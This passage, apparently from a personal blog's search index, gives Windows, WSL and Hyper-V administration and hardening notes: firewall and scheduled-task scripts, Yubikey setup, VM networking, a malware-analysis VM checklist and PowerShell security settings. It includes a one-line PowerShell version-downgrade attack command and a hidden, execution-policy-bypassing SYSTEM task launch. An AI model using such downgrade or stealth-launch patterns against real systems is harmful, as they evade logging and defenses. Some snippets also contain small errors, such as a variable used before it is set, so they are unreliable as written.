rule to limit access.</p> <p>You'll want to write your own firewall rules to carefully allow only certain traffic to talk with this service. We can accomplish this by specifying Network Adapters, in our case, the <code>vEthernet (WSL)</code> adapter. However there are few things to be aware of:</p> <ul> <li>Hyper-V adapters are regenerated on every reboot of the host</li> <li>You'll need to redeploy this firewall rule on each reboot</li> <li>This is a good opportunity to write a scheduled task to maintain minimum inbound firewall rules (Windows often enables rules silently)</li> </ul> <p>Here's the PowerShell script to be run as a scheduled task. Save it to a location that's owned and only writable by Administrator and SYSTEM, for example <code>C:\\Tools\\Scripts\\ReApply-FirewallRulesUsbipd.ps1</code>. Check that the script file itself is also owned by an Administrator, and not writable by anyone besides administrators and SYSTEM (<code>get-acl .\\Path\\To\\Script.ps1 | fl</code>).</p> <ul> <li>Enumerate interfaces with <code>-IncludeHidden</code>, this will show virtual switches</li> <li>Array Examples</li> <li>-ExpandProperty</li> <li>-Contains</li> <li>Create a Job that Runs at Startup</li> <li>Register ScheduledTask from XML</li> </ul> <pre><code># Remove any previous usbipd rules\nGet-NetFirewallRule -DisplayName \"usbipd*\" | Remove-NetFirewallRule\n\n# Default port for usbipd\n$Port = 3240\n\n# Allow connections from the WSL and Hyper-V adpaters, add or remove adapters as needed\n$Interfaces = @(\"vEthernet (WSL (Hyper-V firewall))\", \"vEthernet (Default Switch)\")\n$ExistingInterfaces = Get-NetAdapter -IncludeHidden | Select-Object -ExpandProperty Name\n\n# Apply the rule if the adapter exists\nforeach ($Interface in $Interfaces) {\n    if ($ExistingInterfaces -contains $Interface) {\n        New-NetFirewallRule -DisplayName \"usbipd connections for $Interface\" -Profile Any -Direction Inbound -Protocol TCP -LocalPort $Port -InterfaceAlias $Interface -Action Allow -Program \"C:\\Program Files\\usbipd-win\\usbipd.exe\"\n    }\n}\n\n# Without blockinboundalways, ensure only the minimum inbound rules are enabled\nGet-NetFirewallRule -Direction Inbound | where { $_.Enabled -eq \"True\" -and $_.DisplayName -inotmatch \"(usbipd connections for *|Core Networking - Dynamic Host Configuration Protocol*|INSERT-MORE-RULES-HERE)\" } | Set-NetFirewallRule -Enabled False\n</code></pre> <p>Copy and paste this block to register the scheduled task to run at startup:</p> <pre><code>$taskname = \"Re-Apply Firewall Rules (usbipd)\"\nUnregister-ScheduledTask -TaskName $taskname\n$action = New-ScheduledTaskAction -Execute \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Argument \"-nop -ep bypass -w hidden C:\\Tools\\Scripts\\ReApply-FirewallRulesUsbipd.ps1\"\n$trigger1 = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Seconds 30)\n$principal = New-ScheduledTaskPrincipal -UserId \"SYSTEM\" -RunLevel Highest\n$settings = New-ScheduledTaskSettingsSet -Hidden\nRegister-ScheduledTask \"$taskname\" -Action $action -Trigger $trigger1 -Principal $principal\n</code></pre> <p>Interestingly, <code>New-ScheduledTaskTrigger</code> does not allow a time interval or additional perameters if the <code>-AtStartup</code> argument is used. If you want to add a time interval to tasks triggered at startup, after registering the task you'll need to Export it:</p> <pre><code>Export-ScheduledTask -TaskName \"Re-Apply Firewall Rules (usbipd)\" | Out-File -Encoding ascii -Filepath .\\task.xml\n</code></pre> <p>Modify the <code>&lt;Triggers&gt;</code> section to reflect the following (this example runs the task every 10 minutes after startup, indefinitely):</p> <pre><code>  &lt;Triggers&gt;\n    &lt;BootTrigger&gt;\n      &lt;Repetition&gt;\n        &lt;Interval&gt;PT10M&lt;/Interval&gt;\n      &lt;/Repetition&gt;\n    &lt;/BootTrigger&gt;\n  &lt;/Triggers&gt;\n</code></pre> <p>Import the edited xml, which will update your scheduled task in-place with <code>-Force</code>:</p> <pre><code>Register-ScheduledTask -TaskName \"Re-Apply Firewall Rules (usbipd)\" -Xml (Get-Content -Path .\\task.xml | Out-String) -Force\n</code></pre> <p>Confirm your firewall rules with <code>nmap</code> or <code>naabu</code>.</p> <p>TIP: a good way to check this is to first scan your host's Wireless or Ethernet IP from WSL, then the WSL adapter's IP from WSL. Both are techincally your host, and will find any listening ports available to all interfaces on your host. You could use a tool like naabu: <code>./naabu -host YOUR-HOST-IP -port 3240</code>. WSL should be able to connect your vEthernet (WSL) IP address, but not your local Ethernate or WiFi address assigned to the host's physical NIC.</p> <p>Next in your WSL instance, install the USBIP tools and hardware database (NOTE: this is no longer needed as of usbipd v4.0.0):</p> <pre><code>sudo apt install linux-tools-generic hwdata\nsudo update-alternatives --install /usr/local/bin/usbip usbip /usr/lib/linux-tools/*-generic/usbip 20\n</code></pre> <p>On your host, use <code>usbipd --help</code> to start attaching USB devices. The tutorial on learn.microsoft.com has additional examples. To attach a USB device to WSL:</p> <pre><code>usbipd wsl list\nusbipd wsl attach --busid &lt;busid&gt;\nusbipd wsl detach --busid &lt;busid&gt;\n</code></pre> <p>If you're having issues with a USB device being \"stuck\" as attached, run this to detach all devices:</p> <pre><code>usbipd wsl detach -a\n</code></pre> <p>If you're using a Linux Hyper-V VM instead, you can follow the above but attach it this way, starting on the host:</p> <pre><code>usbipd --help\nusbipd list\nusbipd bind --busid=&lt;BUSID&gt;\n</code></pre> <p>Then from the guest:</p> <pre><code>usbip list --remote=&lt;HOST-WSL-IP&gt;\nsudo usbip attach --remote=&lt;HOST-WSL-IP&gt; --busid=&lt;BUSID&gt;\n</code></pre> <p>On Hyper-V VM's that are missing the correct kernel module, you'll encounter this error:</p> <pre><code>sudo usbip attach --remote=172.26.240.1 --busid=1-6\nlibusbip: error: udev_device_new_from_subsystem_sysname failed\nusbip: error: open vhci_driver\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#gpg-ssh-git-yubikey","title":"GPG + SSH + Git + Yubikey","text":"<p>Tested on WSL 2 running Ubuntu 22.04 5.15.90.1-microsoft-standard-WSL2.</p> <p>First install all the required packages (<code>dbus-user-session</code> may be necessary in some cases):</p> <pre><code>sudo apt install -y scdaemon pcscd [dbus-user-session]\n</code></pre> <p>Configure gpg.conf:</p> <pre><code>personal-cipher-preferences AES256 AES192 AES\npersonal-digest-preferences SHA512 SHA384 SHA256\npersonal-compress-preferences ZLIB BZIP2 ZIP Uncompressed\ndefault-preference-list SHA512 SHA384 SHA256 AES256 AES192 AES ZLIB BZIP2 ZIP Uncompressed\ncert-digest-algo SHA512\ns2k-digest-algo SHA512\ns2k-cipher-algo AES256\ncharset utf-8\nfixed-list-mode\nno-comments\nno-emit-version\nkeyid-format 0xlong\nlist-options show-uid-validity\nverify-options show-uid-validity\nwith-fingerprint\nrequire-cross-certification\nno-symkey-cache\nuse-agent\nthrow-keyids\n</code></pre> <p>Configure gpg-agent.conf:</p> <pre><code>enable-ssh-support\ndefault-cache-ttl 60\nmax-cache-ttl 120\npinentry-program /usr/bin/pinentry-curses\n</code></pre> <p>I've found this set of commands to be crucial to \"refreshing\" gpg-agent so it reads the smartcard. Save them as a bash script so you can call it anytime you have issues authenticating or signing with the smartcard (for example, <code>/usr/local/bin/refresh-smartcard.sh</code>):</p> <pre><code>pkill gpg-agent ; pkill ssh-agent ; pkill pinentry\n#eval $(gpg-agent --daemon --enable-ssh-support)\ngpg-connect-agent \"scd serialno\" \"learn --force\" /bye\ngpg-connect-agent updatestartuptty /bye\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#gpu-passthrough","title":"GPU Passthrough","text":"<p>By default, WSL2 can use the host's GPU. Check with the following commands (Ubuntu 22.04):</p> <ul> <li>NVIDIA: <code>nvidia-smi</code></li> <li>AMD: to do</li> <li>Intel: to do</li> </ul> <p>Resources:</p> <ul> <li>Enable NVIDIA CUDA on WSL</li> <li>NVIDIA: Getting Started with CUDA on WSL2</li> <li>NVIDIA: Container Toolkit</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#miscellaneous","title":"Miscellaneous","text":"<p>Always copy and paste untrusted text into WSL files opened in Notepad or VSCode in Restricted Mode instead of directly into the terminal with an open <code>vi</code> or <code>nano</code> session due to the possibility of command injection / escaping.</p> <ul> <li>This happens when terminal emulators interpret escape sequences</li> <li>Misconfigured terminals will allow escape sequences to execute commands (though this is not the default in modern terminals)</li> <li>It's a rare possibility, but PoC's exist</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#hyper-v","title":"Hyper-V","text":"<p>Enable Hyper-V:</p> <pre><code>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#default-paths","title":"Default Paths","text":"<ul> <li>Virtual Hard Disks (Recommended by kali.org): <code>C:\\ProgramData\\Microsoft\\Windows\\Virtual Hard Disks\\</code></li> <li>Virtual machine configuration folder: <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V</code></li> <li>Checkpoint store: <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V</code></li> <li>Smart Paging folder: <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V</code></li> </ul> <p>If you're storing your VMs on an external drive, the folder structure could look like:</p> <pre><code>VM_NAME\n|_Snapshots\n|_Virtual Hard Disks\n|_Virtual Machines\n</code></pre> <p>The key is in most cases to point all file paths under the VM's settings to the \"VM_NAME\" folder, rather than the subdirectories themselves. Hyper-V will create the subdirectories, and place the correct files into those subdirectories on its own.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#importing-exporting-vms","title":"Importing / Exporting VM's","text":"<p>Hyper-V Import Types</p> <ul> <li>Exporting a VM creates a complete backup</li> <li><code>Register in-place</code> will import and run the VM directly from the files in the import folder (do not use for restoring from backups)</li> <li>In this case, the backup becomes the running VM, meaning if it becomes corrupted or broken you no longer have a backup</li> <li><code>Restore</code> or <code>Copy</code> imports the backup files to specified destination folders for use (separate from the backup files themselves)</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#cloning-vms","title":"Cloning VM's","text":"<p>Hyper-V does not appear to have a cloning feature similar to VMware or VirtualBox. This can easily be replicated by mimicing how VMware and VirtualBox store their VM files, all in a single folder per VM, rather than across multiple folders shared by every VM.</p> <ul> <li>Use a dedicated directory for Virtual Machine folders, similar to <code>~/vmware</code> but with the same ACLs as <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V</code> (admin-only)</li> <li>Create a folder for your $VM_NAME, <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Machines\\VM_NAME</code> works fine</li> <li>If you have an existing VM, export it</li> <li>Import it, but change the location for all of the files to <code>C:\\ProgramData\\Microsoft\\Windows\\Hyper-V\\Virtual Machines\\VM_NAME</code></li> <li>This export can serve as a backup of your template VM used for cloning</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#creating-an-ubuntu-vm","title":"Creating an Ubuntu VM","text":"<p>The easiest way is to use Hyper-V's \"Quick Create\" feature, let it download and install, then do the setup. During setup of your username and password, the Hyper-V image automatically downloads all of the tools to get enhanced session working in the background.</p> <p>Microsoft previously maintained scripts mentioned here:</p> <ul> <li>https://github.com/microsoft/linux-vm-tools</li> <li>https://github.com/mimura1133/linux-vm-tools</li> <li>https://www.kali.org/docs/virtualization/install-hyper-v-guest-enhanced-session-mode/</li> </ul> <p>But they are no longer actively maintained, with this functionality having been built into the Ubuntu Quick Create image.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#manual-installation","title":"Manual Installation","text":"<p>If you prefer to install an Ubuntu VM manually (e.g. using the ISO, going with a minimal install, creating custom partitions, or provisioning SecureBoot) you can still do so with a slightly modified version of the linux-vm-tools script referenced above by using my fork maintained here.</p> <p>There are two changes to the script that are in use with current Quick Create VMs under <code>/etc/xrdp/xrdp.ini</code>:</p> <ul> <li><code>port=vsock://-1:3389</code></li> <li><code>use_vsock=false</code></li> </ul> <p>Instead of <code>use_vsock=true</code>, set <code>port=</code> to specify vsock as the protocol and bind to localhost using <code>-1</code> (otherwise xrdp will try to bind to all interfaces on <code>0.0.0.0</code> or <code>::</code>).</p> <p>Follow the original instructions, using <code>intall.sh</code> from my updated fork.</p> <pre><code>cd ~/Downloads\nwget https://raw.githubusercontent.com/straysheep-dev/linux-vm-tools/master/ubuntu/22.04/install.sh\nchmod +x ./install.sh\nbash ./install.sh\n</code></pre> <p>Finally enable enhanced session mode.</p> <pre><code>Set-VM -VMName \"&lt;vm-name&gt;\" -EnhancedSessionTransportType HVSocket\n</code></pre> <p>Now you can connect via an Enhanced Session just like you can with a Quick Create VM.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#expand-the-disk-space","title":"Expand the Disk Space","text":"<p>References:</p> <ul> <li>How to Resize Partitions and Filesystems</li> <li>Expand Running Filesystem Space</li> <li>Error Resziing Partition on Running OS</li> <li>How to Resize Root Partition at Runtime</li> </ul> <p>Overview on how to do this on an Ubuntu 22.04 VM:</p> <ul> <li>Tell Hyper-V the new size of the disk</li> <li>Use the new free space in the Ubuntu VM by extending the root filesystem</li> </ul> <p>The default disk size when using the \"Quick Create\" feature is roughly 12GB. This will quickly cause issues after a few updates or installing any tools.</p> <p>Using Hyper-V's disk editor it's easy to expand any virtual disk:</p> <ul> <li>Backup (export) a copy of the VM in case anything goes wrong</li> <li>Select the VM &gt; <code>Edit Disk...</code> &gt; Next &gt; <code>Browse...</code> to select the VM's vhdx file</li> <li>Next &gt; Expand &gt; Next &gt; Enter the new size (40GB to 80GB is a good amount)</li> <li>Next &gt; Finish</li> <li>NOTE: Hyper-V may require you delete any checkpoints before expanding the disk</li> <li>Create a new checkpoint</li> </ul> <p>The issue is in attempting to resize the root filesystem partition at runtime to claim the new free space from within the Ubuntu VM, where using the <code>disks</code> GUI utlity even as root fails at expanding the disk with this error message:</p> <pre><code>Error resizing partition /dev/sda1: Failed to set partition size on device '/dev/sda' (Unable to satisfy all constraints on the partition.) (udisks-error-quark, 0)\n</code></pre> <p>Typically the system needs to be shutdown to resize the root filesystem from a Live ISO / CD.</p> <p>To do this at runtime:</p> <ul> <li>Become root <code>sudo su -</code></li> <li><code>parted</code></li> <li>Type <code>print</code> to display the partiton table</li> <li>When asked to fix the GPT to use all the free space, enter <code>Fix</code></li> <li>Check the \"Number\" of your ext4 root filesystem, it's likely <code>1</code>, as the others will be the <code>bios_grub</code> and <code>boot, esp</code> partitions</li> <li><code>resizepart 1 40GB</code> if you expanded your disk to be 40GB</li> <li><code>quit</code></li> <li><code>resize2fs /dev/sda1</code></li> <li><code>systemctl reboot</code></li> </ul> <p>The system should reboot without issue.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#enhanced-session-login-stuck-on-blue-screen","title":"Enhanced Session Login Stuck on Blue Screen","text":"<p>This occurs if you set your user to auto-login during setup. What's happening is your session is already logged in while you're trying to connect over RDP. This will break the session. Simply turn off enhanced session to return to a basic session, log out, log back in, and make the following changes:</p> <pre><code>cd /etc/gdm3\nsudo nano custom.conf\n</code></pre> <p>Comment out the following lines:</p> <pre><code>#AutomaticLoginEnable=true\n#AutomaticLogin=&lt;user&gt;\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#create-a-windows-developer-vm","title":"Create a Windows Developer VM","text":"<p>This is slightly different than importing the VMware version.</p> <p>Windows 11 Developer Eval VM</p> <ul> <li>Extract the vhdx file from the zip archive</li> <li>Place it into your preferred directory for vhdx files (default = <code>C:\\ProgramData\\Microsoft\\Windows\\Virtual Hard Disks\\</code>)</li> <li>Create a new virtual machine, and when choosing a hard disk point it to this vhdx file</li> </ul> <p>Make any additional changes after, like changing memory size and CPU count, before taking an initial snapshot.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#nested-virtualization","title":"Nested Virtualization","text":"<ul> <li>What is Nested Virtualization?</li> <li>Enable Nested Virtualization</li> </ul> <p>For WSL2 to work within a Hyper-V guest you'll need to enable nested virtualization:</p> <pre><code>Set-VMProcessor -VMName WinDev2308Eval -ExposeVirtualizationExtensions $true\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#share-resources","title":"Share Resources","text":"<p>Sharing resources between the guest and host.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#clipboard","title":"Clipboard","text":"<p>Connecting over an Enhanced Sessions allows you to copy and paste text or files into the guest like you would on the host.</p> <ul> <li>When connected over an Enhanced Session, the guest can access and set the host's clipboard</li> <li>You cannot initiate a copy or paste from a guest to the host (meaning there's no API the guest processes can use to initiate changes to the host)</li> <li>The host and hypervisor control the copy and paste functionality</li> </ul> <p>The guest VM cannot access the host clipboard in the following cases:</p> <ul> <li>When the VM is Paused</li> <li>While you're disconnected from the session but the VM is still running</li> <li>When connected over a Basic Session</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#session-settings","title":"Session Settings","text":"<p>Adjusting session settings:</p> <ul> <li>When connecting to a VM and you're setting a display pixel size, instead choose <code>Show Options</code></li> <li>Make changes under the Display tab</li> <li>Make changes under the Local Resources tab &gt; <code>Settings...</code> / <code>More...</code></li> </ul> <p>Save these settings to always reconnect with them automatically applied in the future:</p> <ul> <li>After choosing <code>Show Options</code>, look at the bottom of the Display tab</li> <li>Check <code>Save my settings for future connections to this virtual machine</code></li> </ul> <p>If you ever need to revise these settings:</p> <ul> <li>Open Hyper-V Manager</li> <li>Select the VM, choose <code>Edit Session Settings...</code></li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#share-folders-local-drives","title":"Share Folders, Local Drives","text":"<ul> <li>Share Local Resources with a VM</li> </ul> <p>This isn't as granular as what VMware offers, but it works without networking:</p> <ul> <li>When connecting to a VM and you're setting a display pixel size, instead choose \"Show Options\"</li> <li>Local Resources &gt; Local devices and resources &gt; More &gt; Drives</li> </ul> <p>You'll need to dedicate an entire drive mount to be shared, it's also R/W by default. This isn't as convenient, but a dedicated partition can be created with the disks utilities in Windows.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#create-a-malware-analysis-vm","title":"Create a Malware Analysis VM","text":"<p>First review Microsoft's security checklist for both the Hyper-V host and guest VM's.</p> <p>Note that not everything will apply to this use case.</p> <ul> <li>Hyper-V Security Checklist</li> </ul> <p>Next move on to the following resources and steps:</p> <ul> <li>Hyper-V Intro</li> <li>Hyper-V Architecture</li> <li>Hyper-V Integration Services</li> <li>Hyper-V Networking</li> <li>Share Local Resources with a VM</li> <li>Share Devices with a VM</li> <li>Connect USB Devices (to WSL2)<ul> <li>usbipd: Share USB Devices with Hyper-V and WSL2</li> </ul> </li> <li>Zeltser: Malware Analysis VM Quick Start</li> <li>Zeltser: Malware Analysis VM Detailed Setup</li> </ul> <p>Review the following VM settings:</p> <ul> <li>[ ] Settings &gt; Hardware &gt; SCSI Controller, check for any shared drives or disk drives</li> <li>[ ] Settings &gt; Hardware &gt; Network Adapter, ensure the correct adapter is connected<ul> <li>You likely want a Private Virtual Switch that's entirely logical and not connected to the host</li> <li>Virtual Switch Manager &gt; New virtual network switch &gt; Private &gt; Create Virtual Switch, give it a name like \"Analysis\", click Apply</li> </ul> </li> <li>[ ] Settings &gt; Management &gt; Integration Services &gt; uncheck everything here</li> <li>[ ] Settings &gt; Hardware &gt; Security &gt; Enable Shielding for Windows guests, Linux guests may have issues with this feature</li> </ul> <p>Review the following resources when connecting to the VM (RDP Enhanced Session):</p> <ul> <li>[ ] When connecting, you'll see a \"Display configuration\" menu window to configure screen size, choose \"Show Options\", then the Local Resources tab</li> <li>[ ] Uncheck any items you do not wish to share (likely all of them in this case)</li> <li>[ ] Local Resources &gt; uncheck all</li> <li>[ ] Local Resources &gt; Remote Audio &gt; Settings &gt; Do not play / Do not record</li> <li>[ ] Local Resources &gt; Local devices and resources &gt; More &gt; uncheck all</li> </ul> <p>What session type to use:</p> <ul> <li>Enhanced: With all Integration Services disabled, and not sharing any local resources, you can still connect with Clipboard support for general pentesting</li> <li>Basic: With all of the above steps followed to disable everything, you'd typically do setup with an Enhanced Session and reconnect via Basic to detonate malware</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#hyper-v-troubleshooting","title":"Hyper-V Troubleshooting","text":"<p>There are a number of issues with managing networking in Hyper-V. These items are listed in order of what's most common to least common.</p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#hyper-v-default-switch-has-no-dhcp","title":"Hyper-V Default Switch has no DHCP","text":"<p>NOTE: The Default Switch is supposed to provide DHCP to connected guests, however it often doesn't if strict firewall rules are in place.</p> <p>Guests aren't assigned an IP address when connected to the Default Switch. This requires manually logging into the guest and assigning network information. What makes this more complicated is the subnet and gateway for this swtich changes every time the system reboots.</p> <p>Creating a NAT virtual internal network with a static IP essentially solves this problem. It does not do DHCP, which the Default Switch appears to no longer do in some cases, but when guests are assigned static IP and route information you no longer need to update it on each reboot since this NAT network stays static. The tradeoff if you can only have one NAT network like this per host, so if you have an application that requires a custom NAT network to function, this may not work for you.</p> <p>With that said, if <code>Get-NetNat</code> returns no interfaces, you can create a custom NAT switch and network using the following:</p> <ul> <li>10.55.55.1/24 is chosen since it's relatively obscure and unique, meaning it won't collide with common home wifi, office, or Hyper-V subnets</li> <li>SOHO routers will often default to the range of 192.168.0.0/16</li> <li>Hyper-V tends to use the subnet range of 172.16.0.0/12</li> <li>VPNs and corporate networks will use the range of 10.0.0.0/8, be sure to review any existing network configurations or requirements before using 10.55.55.1/24</li> </ul> <pre><code>New-VMSwitch -SwitchName \"CustomNATSwitch\" -SwitchType Internal\n$ifindex = (Get-NetAdapter -IncludeHidden | where { $_.Name -eq \"vEthernet (CustomNATSwitch)\" }).ifIndex\nNew-NetIPAddress -IPAddress 10.55.55.1 -PrefixLength 24 -InterfaceIndex $ifindex\nNew-NetNat -Name CustomNATNetwork -InternalIPInterfaceAddressPrefix 10.55.55.0/24\n</code></pre> <p>To remove the NAT network and switch:</p> <pre><code>Get-NetNat | where { $_.Name -eq \"CustomNATNetwork\" } | Remove-NetNat\nGet-VMSwitch | where { $_.SwitchName -eq \"CustomNATSwitch\" | Remove-VMSwitch\n</code></pre> <p>If you want to be able to reach VM's on this switch from the host or WSL, you'll need to enable forwarding, as mentioned above in the section titled Communicating with Hyper-V. Just remember, the Windows host is likely filtering <code>ping</code> packets. Try <code>ssh</code>, <code>Test-NetConnection</code>, <code>nmap</code>, or <code>naabu</code> to verify connectivity.</p> <pre><code># Apply\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (CustomNATSwitch)'} | Set-NetIPInterface -Forwarding Enabled\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (WSL (Hyper-V firewall))'} | Set-NetIPInterface -Forwarding Enabled\n\n# Remove\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (CustomNATSwitch)'} | Set-NetIPInterface -Forwarding Disabled\nGet-NetIPInterface | where {$_.InterfaceAlias -eq 'vEthernet (WSL (Hyper-V firewall))'} | Set-NetIPInterface -Forwarding Disabled\n</code></pre> <p>Use case: a router VM like pfSense or Ubuntu Server with static \"WAN\" IP can be assigned and use this custom NAT switch.</p> <ul> <li>The \"router\" VM will always have public internet access via NAT</li> <li>Connect other VM's to the \"router\" VM's \"LAN\" interfaces, if it's running as a router it will handle DHCP and more if configured to do so</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#hyper-v-network-performance-issues","title":"Hyper-V Network Performance Issues","text":"<p>The easiest and safest test is Google's built in speed test, just search for it in Google.</p> <ul> <li>If you have a guest networked behind another guest in a Private Network, it may have reduced network speed; move it to the vEthernet Default Switch<ul> <li>In one case, guests were networked behind a pfSense VM</li> <li>Performance was generally fine for weeks until one day it dropped to unusable speeds</li> <li>Traffic path was VM -&gt; pfSense LAN (Hyper-V Private Switch) -&gt; pfSense WAN (Hyper-V Default Switch) -&gt; Public Internet</li> <li>pfSense VM wasn't low on resources, had normal network speed from it's WAN side (ping)</li> <li>All guests experienced this, and had normal performance when directly networked to the vEthernet Hyper-V switch instead</li> </ul> </li> <li>Poor Network Performance on VM's if VMQ is Enabled<ul> <li>Disable VMQ (set value to 0)</li> <li>Set a static MAC address</li> </ul> </li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#hyper-v-default-network-doesnt-have-internet-access","title":"Hyper-V Default Network doesn't have internet access","text":"<p>This appeared solved, but continues to behave strangely. I wanted to document this as I continue to use Hyper-V.</p> <p>Symptoms: - Hyper-V Default Switch does not have an IP address according to <code>Get-VMNetworkAdapter -ManagementOS</code> (but shows one under <code>ipconfig</code>) - Hyper-V Default Switch shows as \"Status: Operational\" but \"Connectivity IPv4/6: Disconnected\" under Setting &gt; Network &amp; Internet &gt; Advanced network settings &gt; Hardware and connection properties - \"Hyper-V Extensible Virtual Switch\" cannot be checked under Control Panel &gt; Network and Internet &gt; Network Connections &gt; Right-Click Interface &gt; Properties</p> <p>Tried: - Updating NIC driver (this appeared to work until two reboots later, so it may have \"started\" something on the system, or it was just behaving normally that time) - <code>Get-Service vmms | Restart-Service</code> - Enable \"Hyper-V Extensible Virtual Switch\" under the NIC properties (it doesn't allow you to enable it, and alerts you that it must be disabled) - Disable the ethernet adapter port and reboot</p> <p>What's worked: - Assigning a static IP and route manually within the guest VM</p> <p>Here's how you can do this with <code>ip</code> (temporarily): <pre><code># Flush the interface information to start over, do this no matter which option you choose\nsudo ip addr flush dev \"$DEV_NAME\" scope global\n\nDEV_NAME='eth0'\nIP4_ADDR='172.26.240.13'\nIP4_CIDR='20'\nIP4_GATEWAY='172.26.240.1'\n\n# Flush the interface information to start over, do this no matter which option you choose\nsudo ip addr flush dev \"$DEV_NAME\" scope global\nsudo ip address add \"$IP4_ADDR\"/\"$IP4_CIDR\" dev \"$DEV_NAME\"\nsudo ip route add default via \"$IP4_GATEWAY\" dev \"$DEV_NAME\"\n</code></pre></p> <p>Or <code>nmcli</code> (persists reboots): <pre><code># Flush the interface information to start over, do this no matter which option you choose\nsudo ip addr flush dev \"$DEV_NAME\" scope global\n\n# \"$CONN_NAME\" is the connection profile name tied to your \"$DEV_NAME\"\n# Obtain all current profile names with `nmcli connection show`\nsudo nmcli connection modify \"$CONN_NAME\" ipv4.addresses \"$IP4_ADDR\"/\"$IP4_CIDR\"\nsudo nmcli connection modify \"$CONN_NAME\" ipv4.gateway \"$IP4_GATEWAY\"\nsudo nmcli connection modify \"$CONN_NAME\" connection.autoconnect yes\n</code></pre></p> <ul> <li>Rebooting a VM until it \"wakes up\" the Default Switch in Hyper-V (this appears to work, allowing me to assign a static IP from within the guest)</li> <li>Restarting the <code>NetworkManager</code> service (or your equivalent) from within a guest</li> <li>Hyper-V Default Switch still shows \"Connectivity IPv4/6: Disconnected\" even when it's working</li> <li>Hyper-V Extensible Virtual Switch is still unchecked even when it's working</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powershell","title":"PowerShell","text":""},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powershell-versions","title":"PowerShell Versions","text":"<ul> <li>Recent PowerShell versions since v2 have improved security features</li> <li>v2 can still be found installed on some systems, even if v5 is the default</li> <li>Lee Holmes: Detecting and Preventing PowerShell Downgrade Attacks</li> </ul> <p>Version downgrade attacks:</p> <pre><code>powershell.exe -v 2 -command \"...\"\n</code></pre> <p>Disable PowerShell v2 (if nothing in your environment relies on it):</p> <pre><code>Get-WindowsOptionalFeature -Online | where FeatureName -Like MicrosoftWindowsPowerShellV2 | Disable-WindowsOptionalFeature -Online -NoRestart -WarningAction Continue 2&gt;$nul\nGet-WindowsOptionalFeature -Online | where FeatureName -Like MicrosoftWindowsPowerShellV2Root | Disable-WindowsOptionalFeature -Online -NoRestart -WarningAction Continue 2&gt;$nul\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#script-execution","title":"Script Execution","text":"<ul> <li><code>Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\"</code></li> <li> <p><code>Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Windows PowerShell &gt; Turn on Script Execution</code></p> </li> <li> <p>Set Script Execution via GPO</p> </li> <li>Manage Signed and Unsigned Scripts</li> </ul> Group Policy Execution Policy Allow all scripts Unrestricted Allow local scripts and remote signed scripts RemoteSigned Allow only signed scripts AllSigned Disabled Restricted <p>If script execution is set to <code>RemoteSigned</code>, you can unblock a PowerShell script downloaded from the internet to run it with <code>Unblock-File</code>.</p> <p>Set Script Execution to RemoteSigned:</p> <pre><code>$basePath = @(\n    'HKLM:\\Software\\Policies\\Microsoft\\Windows'\n    'PowerShell'\n) -join '\\'\n\nif (-not (Test-Path $basePath)) {\n    $null = New-Item $basePath -Force\n}\n\nSet-ItemProperty $basePath -Name EnableScripts -Value \"1\"\nSet-ItemProperty $basePath -Name ExecutionPolicy -Value \"RemoteSigned\"\n</code></pre> <p>Remove Script Execution Policy:</p> <pre><code>$basePath = @(\n    'HKLM:\\Software\\Policies\\Microsoft\\Windows'\n    'PowerShell'\n) -join '\\'\n\nif (Test-Path $basePath) {\n    Remove-ItemProperty $basePath -Name EnableScripts\n    Remove-ItemProperty $basePath -Name ExecutionPolicy\n}\n</code></pre>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powershell-language-mode","title":"PowerShell Language Mode","text":"<ul> <li>About Language Modes</li> <li>DevBlogs: Constrained Language Mode</li> </ul> <p>Get current Language Mode: <pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre></p>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powershell-jea","title":"PowerShell JEA","text":"<p>Just Enough Admin</p> <ul> <li>JEA Overview</li> </ul>"},{"location":"blog/2024/05/08/material-microsoft-windows-windows/#powershell-protected-event-logging","title":"PowerShell Protected Event Logging","text":"<p>Protected Event Logging</p> <ul> <li>Requires a public key be made and distributed to all 